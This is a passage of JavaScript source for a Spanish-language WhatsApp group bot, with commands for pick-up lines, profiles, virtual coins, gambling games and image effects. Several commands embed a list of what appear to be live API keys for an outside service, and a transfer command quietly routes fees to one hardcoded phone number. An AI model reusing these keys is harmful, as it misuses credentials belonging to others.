				const mary =['Algunos quieren ser ricos a través del dinero, otros del poder, pero lo que no saben, es que la única riqueza es tu amor verdadero.','Soñando contigo he tenido una revelación, ahora necesito que me hagas un hueco en tu corazón.','Aunque por tu corazón han pasado muchas personas, me gustaría que me hicieses un huequecito eterno, por pequeño que sea, por si pasa algo, para que no me olvides jamás.','Lo que siento por ti es tan inmenso que, para guardarlo, me haría falta otro universo.','me he convertido en un capitán pirata para asaltar tu corazón y robarle el amor.','Me preguntaste por qué te amaba y no pude responderte. Hoy entiendo que el amor verdadero es indescriptible, solo se puede sentir.','Ojalá fuese papel para poder envolverte, bombón.','Ansío besarte, abrazarte y no soltarte','A lo mejor mi hogar no es un palacio, pero me gustaría que tú fueses mi princesa.','Te amo demasiado, lo deseo todo contigo, por eso me vuelvo loc@, cuando tú no estás conmigo.','¿De casualidad tienes un mapa contigo? Porque tengo el interés de navegar por esa linda mirada','Desde que te he visto me he convertido un/a astronauta porque no he bajado de las galaxias','A pesar de que el cielo está lleno de estrellas, tú eres la más importante para mi','Si ser guapo fuera pcado, ya estarías haciendo penitencia','Los que dicen que Disneyland es el lugar más feliz del mundo no han estado junto a ti🥺','Si ser guapo matara, serías la bomba atómica😳','Si fuera gato, pasaría mis nueve vidas contigo','¿Y si nos comemos unos tacos y yo te a-taco a besos?']
				const js = mary[Math.floor(Math.random() * mary.length)]
			    wew = fs.readFileSync(`./media/cnf.jpeg`)
				cnf.sendMessage(from, wew, image, { caption: '*ᎮᎥᏒᎧᎮᎧᏕ👌*\n\n'+ js, quoted: mek })
              addFilter(from)
          break

case prefix+'toimg':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	
		  	
				if (!isQuotedSticker) return reply(' etiqueta un sticker')
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await cnf.downloadAndSaveMediaMessage(encmedia)
				ran= getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return reply(' Fallo ')
				buffer = fs.readFileSync(ran)
				cnf.sendMessage(from, buffer, image, {quoted: mek, caption: '🌸Watame-BOT🌸'})
				fs.unlinkSync(ran)
			    })
				await limitAdd(sender) 
				addFilter(from)
          break


    			case prefix+'perfil':
    			if (isBanned) return  reply(mess.banned)
    				cnf.updatePresence(from, Presence.composing)
				      
if (!isRegistered) return reply(ind.noregis())			  
    				try {
					profil = await cnf.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					   const uaangku = checkATMuser(sender)
					profile = `╭─「 *PERFIL* 」
│• *Nombre:* ${pushname}
│• *Rol :${role}*
│• *Usuario registrado:* ✅
│• *Tu Dinero: Rp${uaangku}*
│• *XP: ${getLevelingXp(sender)}*
│• *Level: ${getLevelingLevel(sender)}*				
│• *Link:* wa.me/${sender.split("@")[0]}
╰─────────────────────`
	 				buff = await getBuffer(profil)
					cnf.sendMessage(from, buff, image, {quoted: mek, caption: profile})
					addFilter(from)
          break

			                case prefix+'leveling':
			                if (isBanned) return  reply(mess.banned)
                if (!isGroup) return reply(mess.only.group)
		     if (!isGroupAdmins) return reply(mess.only.admin)			
                if (args.length < 1) return reply('activar oh desactivar')
                if (args[0] === 'activar') {
                if (isLevelingOn) return reply('*la función de nivel ha estado activa antes*')
                 	   _leveling.push(from)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                  	   reply(ind.lvlon())
              	  } else if (args[0] === 'desactivar') {
                  	  _leveling.splice(from, 1)
                 	   fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
                 	    reply(ind.lvloff())
             	   } else {
                 	   reply(ind.satukos())
                	}
				addFilter(from)
          break 
          
          case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('¿Qué quieres buscar?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Ocurre un error o no se encuentran resultados_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Resultados de búsqueda de :* ${teks}`})
}
}
break

				case prefix+'yo':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())
                
                if (!isLevelingOn) return reply(ind.lvlnoon())
			     if (!isGroup) return reply(mess.only.group)			     
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                resul = `┏━━❉ *LEVEL* ❉━━\n┣⊱ *Nombre* : ${pushname}\n┣⊱ Numero : ${sender.split("@")[0]}\n┣⊱ Rol :  ${role}\n┣⊱ User Level : ${userLevel}\n┗━━━━━━━━━━━━`
                costum(resul, text, tescuk, per)
				addFilter(from)
          break 
            
				case prefix+'transferir':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('La cantidad debe ser un número!!')
                if (jumblah < 100 ) return reply(`Transferencia mínima 100`)
                if (jumblah > 5000 ) return reply(`Transferencia máxima 5000`)
                if (checkATMuser(sender) < jumblah) return reply(`No tienes suficiente dinero para realizar la transferencia`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005 *  jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('+51931655706@s.whatsapp.net', fee)
                reply(`*「 ÉXITO 」*\n\nLa transferencia de dinero ha sido exitosa\n\nDe : +${sender.split("@")[0]}\nPara : +${tujuan}\n\nmonto de la transferencia : ${jumblah}\nimpuesto : ${fee}%`)
                addFilter(from)
          break
			
				case prefix+'cartera':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
				const kantong = checkATMuser(sender)
				reply(ind.uangkau(pushname, sender, kantong))
				addFilter(from)
          break

	case prefix+'ruleta':
	if (isBanned) return  reply(mess.banned)
	if (!isRegistered) return reply(ind.noregis())
     const dinn = ['1','1','1','1000','1','1','1']    
  const holi = dinn[Math.floor(Math.random() * dinn.length)]
 if (holi < 5) return reply(`★᭄ꦿ𝐑𝐎𝐔𝐋𝐄𝐓𝐓𝐄💸

-🥀Lo siento🥀
-🥀${pushname}
-🥀As perdido
-🥀No recibes ningun premio
-🥀Gracias por jugar`)
 
reply(`★᭄ꦿ𝐑𝐎𝐔𝐋𝐄𝐓𝐓𝐄💸

-🥀Felicidades 🎉 
-🥀${pushname}
-🥀As Ganado!! 🎉
-🥀Tu premio : 1000 coins`)
addKoinUser(sender, 1000)
addFilter(from)
          break

      case prefix+'wallpaper':
      if (isBanned) return  reply(mess.banned)
 if	(!isRegistered) return reply(ind.noregis())				
 if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				
		        const canogti = ['https://i.ibb.co/6JTzpJJ/68.jpg','https://i.ibb.co/S7CXQmD/15.jpg','https://i.ibb.co/yP4fMMS/18.jpg','https://i.ibb.co/zRHq0qK/47.jpg','https://i.ibb.co/vD00z3C/10.jpg','https://i.ibb.co/NjLb90d/54.jpg','https://i.ibb.co/QDRJmYb/73.jpg','https://i.ibb.co/LkDygnF/39.jpg','https://i.ibb.co/jTqjqLq/58.jpg','https://i.ibb.co/2twGcMw/86.jpg','https://i.ibb.co/vwBDKRf/71.jpg','https://i.ibb.co/JCwQfcZ/9.jpg','https://i.ibb.co/Y8sm3k8/64.jpg','https://i.ibb.co/60LsdQq/76.jpg','https://i.ibb.co/mG8xMC9/5.jpg','https://i.ibb.co/8jM2Wnq/62.jpg','https://i.ibb.co/XWd1wyB/23.jpg','https://i.ibb.co/J36Qvy0/63.jpg','https://i.ibb.co/zRFXfXB/75.jpg','https://i.ibb.co/SNkpKBM/43.jpg','https://i.ibb.co/Yc1ntvk/21.jpg','https://i.ibb.co/ZV0KBN8/44.jpg','https://i.ibb.co/ByScQYM/56.jpg','https://i.ibb.co/gvr3grn/100.jpg','https://i.ibb.co/Mp6kM0S/98.jpg','https://i.ibb.co/str6WsD/93.jpg','https://i.ibb.co/xf1tqN8/53.jpg','https://i.ibb.co/BntKBDt/3.jpg','https://i.ibb.co/cQ2QrfN/103.jpg','https://i.ibb.co/kKMYf84/7.jpg','https://i.ibb.co/C2dJXLM/33.jpg','https://i.ibb.co/ykzwZ08/67.jpg','https://i.ibb.co/qM4z8GC/25.jpg','https://i.ibb.co/w0bPg7H/38.jpg','https://i.ibb.co/QmL9QT2/72.jpg','https://i.ibb.co/Qk4qKWh/85.jpg','https://i.ibb.co/QPyjj7M/29.jpg','https://i.ibb.co/pPKRz5x/46.jpg','https://i.ibb.co/52X0QGk/27.jpg','https://i.ibb.co/tK1XmTS/13.jpg','https://i.ibb.co/b5KFHHy/55.jpg','https://i.ibb.co/ZRD9Z7M/51.jpg','https://i.ibb.co/JH8D2Js/87.jpg','https://i.ibb.co/X38B1Ns/81.jpg','https://i.ibb.co/9Ztpn3y/2.jpg','https://i.ibb.co/g7P9NT4/26.jpg','https://i.ibb.co/j5m8sgf/8.jpg','https://i.ibb.co/njnkMWC/32.jpg','https://i.ibb.co/M80BmZZ/16.jpg','https://i.ibb.co/tQqGkCf/77.jpg','https://i.ibb.co/S6Np1Vm/49.jpg','https://i.ibb.co/TbkQk71/90.jpg','https://i.ibb.co/1GVqwsn/50.jpg','https://i.ibb.co/mb0Xr9X/59.jpg','https://i.ibb.co/WnDMywW/4.jpg','https://i.ibb.co/rbBvMX4/84.jpg','https://i.ibb.co/7twNvNX/74.jpg','https://i.ibb.co/jRKDHRz/48.jpg','https://i.ibb.co/KqqYTWk/89.jpg','https://i.ibb.co/qMQNSjG/12.jpg','https://i.ibb.co/FgNw4hb/11.jpg','https://i.ibb.co/9NW9VnZ/17.jpg','https://i.ibb.co/jMc9vdx/95.jpg','https://i.ibb.co/BskF3jg/104.jpg','https://i.ibb.co/yV56m6S/99.jpg','https://i.ibb.co/5GCxFC5/19.jpg','https://i.ibb.co/8mKGXzg/31.jpg','https://i.ibb.co/4VWX6dn/34.jpg','https://i.ibb.co/fq6LjHw/82.jpg','https://i.ibb.co/CbbP0QB/80.jpg','https://i.ibb.co/vPqyBCK/36.jpg','https://i.ibb.co/k5QxxBb/57.jpg','https://i.ibb.co/WymrdBf/102.jpg','https://i.ibb.co/cth1cwb/79.jpg','https://i.ibb.co/dJRTT6f/83.jpg','https://i.ibb.co/55szk9F/91.jpg','https://i.ibb.co/sgTbTLb/65.jpg','https://i.ibb.co/8rLfBDy/24.jpg','https://i.ibb.co/W0zbd1J/66.jpg','https://i.ibb.co/g7523mx/14.jpg','https://i.ibb.co/nB8CzdY/22.jpg','https://i.ibb.co/prbLDzX/101.jpg','https://i.ibb.co/r2sZVDR/37.jpg','https://i.ibb.co/t2pn4dL/94.jpg','https://i.ibb.co/F0CkFPp/35.jpg','https://i.ibb.co/7nwhZ3w/96.jpg','https://i.ibb.co/89r7C2b/20.jpg','https://i.ibb.co/TTYYgP3/69.jpg','https://i.ibb.co/JKp6Hqr/52.jpg','https://i.ibb.co/k8FknTC/41.jpg','https://i.ibb.co/37Nk23b/6.jpg','https://i.ibb.co/zSC3dHS/88.jpg','https://i.ibb.co/dLNthzx/60.jpg','https://i.ibb.co/3RPnFTc/105.jpg','https://i.ibb.co/kHbRF4Z/28.jpg','https://i.ibb.co/XYx1rFS/1.jpg','https://i.ibb.co/pxtTK6j/40.jpg','https://i.ibb.co/tKTjL9s/30.jpg','https://i.ibb.co/FHZt6NH/45.jpg','https://i.ibb.co/3kV41Nj/42.jpg','https://i.ibb.co/WDGcQ4X/78.jpg','https://i.ibb.co/XYh4fqF/70.jpg','https://i.ibb.co/B3rHm58/61.jpg','https://i.ibb.co/Vqxn77Z/97.jpg','https://i.ibb.co/DQ5P1Xq/92.jpg']
		        let canbgtip = canogti[Math.floor(Math.random() * canogti.length)]
                h = await getBuffer(canbgtip)
                cnf.sendMessage(from, h, image, {quote: mek})
		        await limitAdd(sender)
                addFilter(from)
          break

case prefix+'yaoi':
if (isBanned) return  reply(mess.banned)   
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
 const uaangkaputouuuu = checkATMuser(sender)
const jñpitooo = [`${uaangkaputouuuu}`]
if (jñpitooo < 50) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 50)
const yao = ['https://i.ibb.co/6ttzZjP/16.jpg','https://i.ibb.co/Sy2xc1P/12.jpg','https://i.ibb.co/8d2m1gF/15.jpg','https://i.ibb.co/BsYb0xN/36.jpg','https://i.ibb.co/dtgLh00/2.jpg','https://i.ibb.co/GHz2Qdx/25.jpg','https://i.ibb.co/sFVs1bt/1.jpg','https://i.ibb.co/d2J2KDj/24.jpg','https://i.ibb.co/NVHpkWp/23.jpg','https://i.ibb.co/KxVB3wY/22.jpg','https://i.ibb.co/t3ytyh6/21.jpg','https://i.ibb.co/GVrKbYD/20.jpg','https://i.ibb.co/WDttFJK/19.jpg','https://i.ibb.co/517JFnF/18.jpg','https://i.ibb.co/zGRdbtZ/4.jpg','https://i.ibb.co/WVYF9JL/3.jpg','https://i.ibb.co/ZN7zsbk/5.jpg','https://i.ibb.co/WDDgvTq/28.jpg','https://i.ibb.co/vxfVSzy/27.jpg','https://i.ibb.co/RSkfN6D/26.jpg','https://i.ibb.co/wLzRyr2/13.jpg','https://i.ibb.co/HBpxR3v/17.jpg','https://i.ibb.co/1m19qTS/35.jpg','https://i.ibb.co/6vXpDm0/11.jpg','https://i.ibb.co/myvQCmx/34.jpg','https://i.ibb.co/pRPyw6Q/33.jpg','https://i.ibb.co/gZmRKNC/10.jpg','https://i.ibb.co/pJpcWtw/32.jpg','https://i.ibb.co/vH7DBc9/9.jpg','https://i.ibb.co/fCMMBt4/31.jpg','https://i.ibb.co/p49wLDJ/8.jpg','https://i.ibb.co/3Cft0R5/30.jpg','https://i.ibb.co/qYQgGQZ/7.jpg','https://i.ibb.co/0s5x61M/6.jpg','https://i.ibb.co/C8Nngyq/29.jpg','https://i.ibb.co/Np0VTVw/14.jpg']
let yaoii  = yao[Math.floor(Math.random() * yao.length)]   
  yaoiii = await getBuffer(yaoii)           
                cnf.sendMessage(from, yaoiii, image, {quote: mek, caption: 'Se te cobraron 50 coins'})		       
                addFilter(from)
          break
                
case prefix+'todos':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroup) return reply(mess.only.group)
					var nom = mek.participant
					members_id = []
					teks = '\n'
					for (let mem of groupMembers) {
						teks += `├╼ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(`*▢ Grupo:*  ${groupName}\n*▢ Miembros:* ${groupMembers.length} \n*▢ Total De Admins:* ${groupAdmins.length}\n┌───⊷ *MENCIONES* ⊶`+teks+'└──✪ 🌸Watame-BOT🌸 ✪──⊷* ', members_id, true)
					addFilter(from)
          break

                        
case prefix+'wame':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

                   cnf.updatePresence(from, Presence.composing) 
      options = {
          text: `「 *LINK WHATSAPP* 」\n\nSolicitado por : @${sender.split("@s.whatsapp.net")[0]}\n\nSu link de Whatsapp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n`,
          contextInfo: { mentionedJid: [sender] }
    }
    cnf.sendMessage(from, options, text, { quoted: mek } )
				addFilter(from)
          break

case prefix+'apostar':
if (!isRegistered) return reply(ind.noregis())
if (isBanned) return  reply(mess.banned)
dineroapostado = body.slice(9)
if (args.length < 1) return reply('¿Cuánto deseas apostar?')
  if(isNaN(dineroapostado)) return await reply('La cantidad debe ser un número')
  if(dineroapostado < 10) return await reply(`La apuesta debe ser mayor o igual a 10`)
  if(dineroapostado > 2000) return await reply(`Quién apuesta más de lo que puede ganar?`)
 const apuest = checkATMuser(sender)
if (apuest < dineroapostado) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, dineroapostado)
const gpp = ['10','10','10','10','5000']
	const gppp = gpp[Math.floor(Math.random() * gpp.length)]
piro = `*[💲] [ 𝗔𝗣𝗨𝗘𝗦𝗧𝗔𝗦 ] [💲]*

᭕- Dinero apostado :
᭕- ${dineroapostado}
᭕- Jugador :
᭕- ${pushname}

*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀??𝐎--{-💲}*
        ༊    PERDEDOR    ༊
*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎--{-💲}*

× No ganas nada
× Pierdes el dinero apostado

× Gracias por jugar`


ganadorxd = `*[💲] [ 𝗔𝗣𝗨𝗘𝗦𝗧𝗔𝗦 ] [💲]*

᭕- Dinero apostado :
᭕- ${dineroapostado}
᭕- Jugador :
᭕- ${pushname}

*{💲}---𝐑𝐄𝐒????𝐓𝐀𝐃𝐎--{-💲}*
        ༊     GANADOR     ༊
*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎--{-💲}*

× Ganaste :
× 2000 coins

× Gracias por jugar`
if (gppp < 90) return reply(piro)
addKoinUser(sender, 2000)

reply(`${ganadorxd}`)
addFilter(from)
          break


case prefix+'coinflip':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

dineroapostadoo = args.join(" ")
if (dineroapostadoo < 1) return reply('¿Cuánto deseas apostar?')
if (dineroapostadoo > 501) return reply('La caja no puede pagar tanto :c')
  if(isNaN(dineroapostadoo)) return await reply('La cantidad debe ser un número')
const dap = checkATMuser(sender)
if (dap < dineroapostadoo) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, dineroapostadoo)
const cgn = ['5','10','5','10']
const ccgn = cgn[Math.floor(Math.random() * cgn.length)]

fli = `ᐅ La moneda aterrizo en: *CARA*.
Perdiste ${dineroapostadoo} coins`
if (ccgn < 7) return reply(fli)
fee = 3 * dineroapostadoo
addKoinUser(sender, fee)
flip = `ᐅ La moneda aterrizo en: *CRUZ*.
Ganaste ${fee} coins`
reply(flip)
addFilter(from)
          break

case prefix+'blood':   
if (isBanned) return  reply(mess.banned)  
if (!isRegistered) return reply(ind.noregis())			  

        
const apis9 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe9 = apis9[Math.floor(Math.random() * apis9.length)]
                bpp = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/bloodfrosted?apikey=${nepe9}&text=${bpp}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})                  
                  addFilter(from)
          break  
                  
case prefix+'blood2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
	  

           const apis8 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe8 = apis8[Math.floor(Math.random() * apis8.length)]     
                bpp1 = `${body.slice(8)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/horrorblood?apikey=${nepe8}&text=${bpp1}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})
                  
                  addFilter(from)
          break 
                   
case prefix+'bokeh':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  


           const apis7 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe7 = apis7[Math.floor(Math.random() * apis7.length)]     
                bpp2 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/bokeh?apikey=${nepe7}&text=${bpp2}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})
                  
                  addFilter(from)
          break 
                   
case prefix+'toxic':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	
	
	  
const tox = checkATMuser(sender)
const toxx = [`${tox}`]
if (toxx < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
          const apis1 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe1 = apis1[Math.floor(Math.random() * apis1.length)]    
                bpp3 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/toxic?apikey=${nepe1}&text=${bpp3}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})        
                  addFilter(from)
          break 
                   
case prefix+'ice':
if (isBanned) return  reply(mess.banned)     
if (!isRegistered) return reply(ind.noregis())		

	  
 const icee = checkATMuser(sender)
const icce = [`${icee}`]
if (icce < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
const apis =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe = apis[Math.floor(Math.random() * apis.length)]                
                bpp5 = `${body.slice(5)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/icecold?apikey=${nepe}&text=${bpp5}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break  
                  
case prefix+'box':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())		
	  

 const boxx = checkATMuser(sender)
const boox = [`${boxx}`]
if (boox < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
       const apis2 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe22 = apis2[Math.floor(Math.random() * apis2.length)]        
                bpp4 = `${body.slice(5)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/box3d?apikey=${nepe22}&text=${bpp4}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break 
                   
case prefix+'love':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	

 const loove = checkATMuser(sender)
const lovee = [`${loove}`]
if (lovee < 30) return reply(`𝐋𝐨 𝐬𝐢𝐞𝐧??𝐨 𝐜𝐨𝐢𝐧𝐬 𝐢𝐧𝐬𝐮𝐟𝐢𝐜𝐢𝐞𝐧𝐭𝐞𝐬.`)
confirmATM(sender, 30) 	
    const apis3 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe33 = apis3[Math.floor(Math.random() * apis3.length)]           
                bpp7 = `${body.slice(6)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/love?apikey=${nepe33}&text=${bpp7}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break  
                  
case prefix+'luxury':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())		
	  

 const luux = checkATMuser(sender)
const luxx = [`${luux}`]
if (luxx < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
   const apis4 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe4 = apis4[Math.floor(Math.random() * apis4.length)]           
                bpp6 = `${body.slice(8)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/luxury?apikey=${nepe4}&text=${bpp6}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break 
                   
case prefix+'love2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

			  
 const loovee = checkATMuser(sender)
const lovvve = [`${loovee}`]
if (lovvve < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
            const apis5 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe5 = apis5[Math.floor(Math.random() * apis5.length)]    
                bpp8 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/lovemessage?apikey=${nepe5}&text=${bpp8}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  addFilter(from)
          break  

case prefix+'wpanime':
if (isBanned) return  reply(mess.banned)	      
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
 const wp = checkATMuser(sender)
const wlp = [`${wp}`]
if (wlp < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
					                                const canuugti = ['https://i.ibb.co/sF5Fdt1/1d15523b5b93da72799e1c3b92ef5fef.jpg','https://i.ibb.co/17Lbj2j/44764f88fd4c43fb6db7c2d4e226ee9a.jpg','https://i.ibb.co/qBn79dv/041cf4ee7596e251cbe9b8d95ac69ab2.jpg','https://i.ibb.co/4WbBKXY/0580e84577023fcb3d7b65490be66f69.jpg','https://i.ibb.co/Fgxd6tS/cf3ff3a484d851fc077ef5e5c81c9d65.jpg','https://i.ibb.co/ZMBynRh/e7a7ddbeafa8c14e249691a7c3c4c0b2.jpg','https://i.ibb.co/KGL9m5g/dd40d5d0fe5b1df5097ca4400ae2ad16.jpg','https://i.ibb.co/ZMZYmKz/419b0bddd10310b8611653055ec8c7b0.jpg','https://i.ibb.co/jy8sgbh/c401a02422508128821921b31539091e.jpg','https://i.ibb.co/02M4h6S/5b1871bba0fb4b4e01c4356bdd93cd86.jpg','https://i.ibb.co/997FbVT/133053afa7ee650e45f782ce8475aed8.jpg','https://i.ibb.co/xzPvvDv/18cf2c41770f9edbbf31be8bec2fb0b2.jpg','https://i.ibb.co/HYn2B4Q/702c6cf7e374a02d1da0a5f794858a38.jpg','https://i.ibb.co/7nxQBkY/f2bcf894118518cd15fd69b033da78d1.jpg','https://i.ibb.co/yd61B8v/0d12c692d699ae3ff158d54d2fe02971.jpg','https://i.ibb.co/vD8HsGD/8dcea7573f193abf7ea26aefdc8f6949.jpg','https://i.ibb.co/1Z89RJT/ec77640a70d388ab3689b922b488e000.jpg','https://i.ibb.co/98bLyLD/6c54a7a35f7c3a3a974b15b0c9c666fa.jpg','https://i.ibb.co/nsxPVMx/d51a5164ed57c571de2f337823cdfe0d.jpg','https://i.ibb.co/r4QNhf1/e62aadd019b27bcc954f9f463a8a268d.jpg','https://i.ibb.co/Qfp7vS7/4838313f143a833ec931ac026665de39.jpg','https://i.ibb.co/fYqMq9T/a7134ce6fba2dc5efd9faa6fe4213444.jpg','https://i.ibb.co/ZN397Tk/06ebb4fbc32809c99f173b3ac5596c68.jpg','https://i.ibb.co/ZdCV7G8/cca874c663aeb20eed0baa477de679cc.jpg','https://i.ibb.co/s5TJN3L/5db7c137c1f672e15dc98910aef3a77a.jpg','https://i.ibb.co/r3k8sWQ/ca50357dd6a4638dd9199d02ac810828.jpg','https://i.ibb.co/h1tMDLD/e0e5d60bdfb0c93eb723a1d0e15d6756.jpg','https://i.ibb.co/3NXvXwR/d10db58ff9114e1575de143b723ddc9b.jpg','https://i.ibb.co/fMbJ33j/83850d24bd8312104701f3e93bdaa3e0.jpg','https://i.ibb